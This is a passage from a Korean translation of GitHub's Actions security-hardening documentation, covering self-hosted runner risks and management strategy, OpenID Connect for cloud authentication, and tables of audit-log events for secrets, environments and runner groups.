- 컴퓨터에 중요한 서비스에 대한 네트워크 액세스 권한이 있나요? 예를 들어 Azure 또는 AWS 메타데이터 서비스입니다. 이 환경에서 중요한 정보의 양을 최소한으로 유지해야 하며, 워크플로를 호출할 수 있는 모든 사용자가 이 환경에 액세스할 수 있다는 점을 항상 염두에 두어야 합니다.

일부 고객은 각 작업 실행 후 자체 호스팅 실행기를 자동으로 삭제하는 시스템을 구현하여 해당 위험을 부분적으로 완화하려고 시도할 수 있습니다. 그러나 자체 호스팅 실행기에서 하나의 작업만 실행하도록 보장할 방법이 없으므로 이 방법은 의도한 만큼 효과적이지 않을 수 있습니다. 일부 작업은 같은 실행기에서 실행되는 다른 작업에서 볼 수 있는 명령줄 인수(예: `ps x -w`)로 비밀을 사용합니다. 이로 인해 비밀 누출이 발생할 수 있습니다.

### 자체 호스팅 실행기를 위한 관리 전략 계획

자체 호스팅 실행기를 {% data variables.product.prodname_dotcom %} 계층 구조의 다양한 수준(엔터프라이즈, 조직 또는 리포지토리 수준)에 추가할 수 있습니다. 이 배치는 실행기를 관리할 수 있는 사용자를 결정합니다.

**중앙 집중식 관리**
  - 중앙 집중식 팀이 자체 호스트 실행기를 소유하도록 하려는 경우 가장 높은 상호 조직 또는 엔터프라이즈 수준에서 실행기를 추가하는 것이 좋습니다. 이를 통해 팀은 실행기를 보고 관리할 수 있는 단일 위치가 생깁니다.
  - 단일 조직만 있는 경우 조직 수준에서 실행기를 추가하는 것은 사실상 동일한 방법이지만 나중에 다른 조직을 추가하면 문제가 발생할 수 있습니다.

**탈중앙 집중식 관리**
  - 각 팀이 자체 호스팅 실행기를 관리하는 경우 가장 높은 수준의 팀 소유권에서 실행기를 추가하는 것이 좋습니다. 예를 들어 각 팀이 자체 조직을 소유하는 경우 실행기도 조직 수준에서 추가하면 가장 간단합니다.
  - 리포지토리 수준에서 실행기를 추가할 수도 있지만 리포지토리 간에 실행기를 공유할 수 없으므로 관리 오버헤드가 추가되고 필요한 실행기 수도 증가합니다.

{% ifversion fpt or ghec or ghes > 3.4 %}
### 클라우드 공급자에 인증

{% data variables.product.prodname_actions %}을 사용하여 클라우드 공급자에게 배포하거나 비밀 관리에 HashiCorp Vault를 사용하려는 경우 OpenID Connect를 사용하여 워크플로 실행에 대한 단기의, 넓은 범위의 액세스 토큰을 만드는 것이 좋습니다. 자세한 내용은 “[OpenID Connect 보안 강화 정보](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)”를 참조하세요.

{% endif %}

## {% data variables.product.prodname_actions %} 이벤트 감사

감사 로그를 사용하여 조직의 관리 작업을 모니터링할 수 있습니다. 감사 로그는 작업 유형, 실행 시기 및 작업을 수행한 개인 계정을 기록합니다.

예를 들어 감사 로그를 사용하여 조직 비밀에 대한 변경 내용을 추적하는 `org.update_actions_secret` 이벤트를 추적할 수 있습니다. ![감사 로그 항목](/assets/images/help/repository/audit-log-entries.png)

다음 표에서는 감사 로그에서 찾을 수 있는 {% data variables.product.prodname_actions %} 이벤트에 대해 설명합니다. 감사 로그 사용에 대한 자세한 내용은 “[조직 감사 로그 검토](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log)” 및 “[엔터프라이즈 감사 로그 검토](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise)”를 참조하세요.

{% ifversion fpt or ghec %}
### 환경에 대한 이벤트

| 작업 | 설명
|------------------|-------------------
| `environment.create_actions_secret` | 환경에서 비밀을 만들 때 트리거됩니다. 자세한 내용은 [“환경 비밀](/actions/reference/environments#environment-secrets)”을 참조하세요.
| `environment.delete` | 환경이 삭제될 때 트리거됩니다. 자세한 내용은 [“환경 삭제](/actions/reference/environments#deleting-an-environment)”를 참조하세요.
| `environment.remove_actions_secret` |  환경에서 비밀이 제거될 때 트리거됩니다. 자세한 내용은 [“환경 비밀](/actions/reference/environments#environment-secrets)”을 참조하세요.
| `environment.update_actions_secret` | 환경의 비밀이 업데이트될 때 트리거됩니다. 자세한 내용은 [“환경 비밀](/actions/reference/environments#environment-secrets)”을 참조하세요.
{% endif %}

{% ifversion fpt or ghes or ghec %}
### 구성 변경에 대한 이벤트
| 작업 | 설명
|------------------|-------------------
| `repo.actions_enabled` | 리포지토리에 대해 {% data variables.product.prodname_actions %}을 사용할 때 트리거됩니다. UI를 사용하여 볼 수 있습니다. REST API를 사용하여 감사 로그에 액세스할 때는 이 이벤트가 표시되지 않습니다. 자세한 내용은 “[ 사용](#using-the-rest-api)”을 참조하세요.
| `repo.update_actions_access_settings` | 다른 리포지토리의 {% data variables.product.prodname_actions %} 워크플로에서 리포지토리를 사용하는 방법을 제어하는 설정이 변경될 때 트리거됩니다.
{% endif %}

### 비밀 관리에 대한 이벤트
| 작업 | 설명
|------------------|-------------------
| `org.create_actions_secret` | 조직에 대해 {% data variables.product.prodname_actions %} 비밀이 만들어지면 트리거됩니다. 자세한 정보는 “[조직의 암호화된 비밀 만들기](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization)”를 참조하세요.
| `org.remove_actions_secret` | {% data variables.product.prodname_actions %} 비밀이 제거될 때 트리거됩니다.
| `org.update_actions_secret` | {% data variables.product.prodname_actions %} 비밀이 업데이트될 때 트리거됩니다.
| `repo.create_actions_secret ` | 리포지토리에 대한 {% data variables.product.prodname_actions %} 비밀이 만들어지면 트리거됩니다. 자세한 정보는 “[리포지토리의 암호화된 비밀 만들기](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository)”를 참조하세요.
| `repo.remove_actions_secret` | {% data variables.product.prodname_actions %} 비밀이 제거될 때 트리거됩니다.
| `repo.update_actions_secret` | {% data variables.product.prodname_actions %} 비밀이 업데이트될 때 트리거됩니다.

### 자체 호스팅 실행기에 대한 이벤트
| 작업 | 설명
|------------------|-------------------
| `enterprise.register_self_hosted_runner` | 새 자체 호스팅 실행기를 등록할 때 트리거됩니다. 자세한 내용은 “[엔터프라이즈에 자체 호스트 실행기 추가](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise)”를 참조하세요.
| `enterprise.remove_self_hosted_runner` | 자체 호스팅 실행기를 제거할 때 트리거됩니다.
| `enterprise.runner_group_runners_updated` | 실행기 그룹의 멤버 목록이 업데이트될 때 트리거됩니다. 자세한 내용은 “[조직의 그룹에서 자체 호스트 실행기 설정](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)”을 참조하세요.
| `enterprise.self_hosted_runner_online` | 실행기 애플리케이션이 시작될 때 트리거됩니다. REST API를 사용해서만 볼 수 있습니다. UI 또는 JSON/CSV 내보내기에서 표시되지 않습니다. 자세한 내용은 “[자체 호스팅 실행기의 상태 검사](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”를 참조하세요.
| `enterprise.self_hosted_runner_offline` | 실행기 애플리케이션이 중지될 때 트리거됩니다. REST API를 사용해야만 볼 수 있으며 UI 또는 JSON/CSV 내보내기에 표시되지 않습니다. 자세한 내용은 “[자체 호스팅 실행기의 상태 검사](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”를 참조하세요.
| `enterprise.self_hosted_runner_updated` | 실행기 애플리케이션이 업데이트될 때 트리거됩니다. REST API 및 UI를 사용하여 볼 수 있습니다. 감사 로그를 JSON 데이터 또는 CSV 파일로 내보낼 때는 이 이벤트가 포함되지 않습니다. 자세한 내용은 “[자체 호스팅 실행기 정보](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)” 및 “[조직의 감사 로그 검토](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log)”를 참조하세요.
| `org.register_self_hosted_runner` | 새 자체 호스팅 실행기를 등록할 때 트리거됩니다. 자세한 내용은 “[조직에 자체 호스트 실행기 추가](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization)”를 참조하세요.
| `org.remove_self_hosted_runner` | 자체 호스팅 실행기를 제거할 때 트리거됩니다. 자세한 내용은 “[조직에서 실행기 제거](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization)”를 참조하세요.
| `org.runner_group_runners_updated` | 실행기 그룹의 멤버 목록이 업데이트될 때 트리거됩니다. 자세한 내용은 “[조직의 그룹에서 자체 호스팅 실행기 설정](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)”을 참조하세요.
| `org.runner_group_updated` | 자체 호스팅 실행기 그룹의 구성이 변경될 때 트리거됩니다. 자세한 내용은 “[자체 호스팅 실행기 그룹의 액세스 정책 변경](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)”을 참조하세요.
| `org.self_hosted_runner_online` | 실행기 애플리케이션이 시작될 때 트리거됩니다. REST API를 사용해서만 볼 수 있습니다. UI 또는 JSON/CSV 내보내기에서 표시되지 않습니다. 자세한 내용은 “[자체 호스팅 실행기의 상태 검사](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”를 참조하세요.
| `org.self_hosted_runner_offline` | 실행기 애플리케이션이 중지될 때 트리거됩니다. REST API를 사용해야만 볼 수 있으며 UI 또는 JSON/CSV 내보내기에 표시되지 않습니다. 자세한 내용은 “[자체 호스팅 실행기의 상태 검사](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”를 참조하세요.
| `org.self_hosted_runner_updated` | 실행기 애플리케이션이 업데이트될 때 트리거됩니다. REST API 및 UI를 사용하여 볼 수 있으며 JSON/CSV 내보내기에 표시되지 않습니다. 자세한 내용은 “[자체 호스트 실행기 정보](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)”를 참조하세요.
| `repo.register_self_hosted_runner` | 새 자체 호스팅 실행기를 등록할 때 트리거됩니다. 자세한 내용은 “[리포지토리에 자체 호스트 실행기 추가](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository)”를 참조하세요.
| `repo.remove_self_hosted_runner` | 자체 호스팅 실행기를 제거할 때 트리거됩니다. 자세한 내용은 “[리포지토리에서 실행기 제거](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository)”를 참조하세요.
| `repo.self_hosted_runner_online` | 실행기 애플리케이션이 시작될 때 트리거됩니다. REST API를 사용해서만 볼 수 있습니다. UI 또는 JSON/CSV 내보내기에서 표시되지 않습니다. 자세한 내용은 “[자체 호스팅 실행기의 상태 검사](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”를 참조하세요.
| `repo.self_hosted_runner_offline` | 실행기 애플리케이션이 중지될 때 트리거됩니다. REST API를 사용해야만 볼 수 있으며 UI 또는 JSON/CSV 내보내기에 표시되지 않습니다. 자세한 내용은 “[자체 호스팅 실행기의 상태 검사](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)”를 참조하세요.
| `repo.self_hosted_runner_updated` | 실행기 애플리케이션이 업데이트될 때 트리거됩니다. REST API 및 UI를 사용하여 볼 수 있으며 JSON/CSV 내보내기에 표시되지 않습니다. 자세한 내용은 “[자체 호스트 실행기 정보](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)”를 참조하세요.

### 자체 호스팅 실행기 그룹에 대한 이벤트
| 작업 | 설명
|------------------|-------------------
| `enterprise.runner_group_created` | 자체 호스팅 실행기 그룹을 만들 때 트리거됩니다. 자세한 내용은 “[엔터프라이즈의 자체 호스트 실행기 그룹 만들기](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise)”를 참조하세요.
| `enterprise.runner_group_removed` | 자체 호스팅 실행기 그룹이 제거될 때 트리거됩니다. 자세한 내용은 “[자체 호스팅 실행기 그룹 제거](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)”를 참조하세요.
| `enterprise.runner_group_runner_removed` | REST API를 사용하여 그룹에서 자체 호스팅 실행기를 제거할 때 트리거됩니다.
| `enterprise.runner_group_runners_added` | 자체 호스팅 실행기를 그룹에 추가할 때 트리거됩니다. 자세한 내용은 “[자체 호스팅 실행기를 그룹으로 이동](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)”을 참조하세요.
| `enterprise.runner_group_updated` |자체 호스팅 실행기 그룹의 구성이 변경될 때 트리거됩니다. 자세한 내용은 “[자체 호스팅 실행기 그룹의 액세스 정책 변경](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)”을 참조하세요.
| `org.runner_group_created` | 자체 호스팅 실행기 그룹을 만들 때 트리거됩니다. 자세한 내용은 “[조직의 자체 호스트 실행기 그룹 만들기](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization)”를 참조하세요.
| `org.runner_group_removed` | 자체 호스팅 실행기 그룹이 제거될 때 트리거됩니다. 자세한 내용은 “[자체 호스팅 실행기 그룹 제거](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)”를 참조하세요.
| `org.runner_group_updated` | 자체 호스팅 실행기 그룹의 구성이 변경될 때 트리거됩니다. 자세한 내용은 “[자체 호스팅 실행기 그룹의 액세스 정책 변경](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)”을 참조하세요.
| `org.runner_group_runners_added` | 자체 호스팅 실행기를 그룹에 추가할 때 트리거됩니다. 자세한 내용은 “[자체 호스팅 실행기를 그룹으로 이동](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)”을 참조하세요.
| `org.runner_group_runner_removed` | REST API를 사용하여 그룹에서 자체 호스팅 실행기를 제거할 때 트리거됩니다. 자세한 내용은 “[조직의 그룹에서 자체 호스트 실행기 제거](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization)”를 참조하세요.

### 워크플로 활동에 대한 이벤트

{% data reusables.actions.actions-audit-events-workflow %}
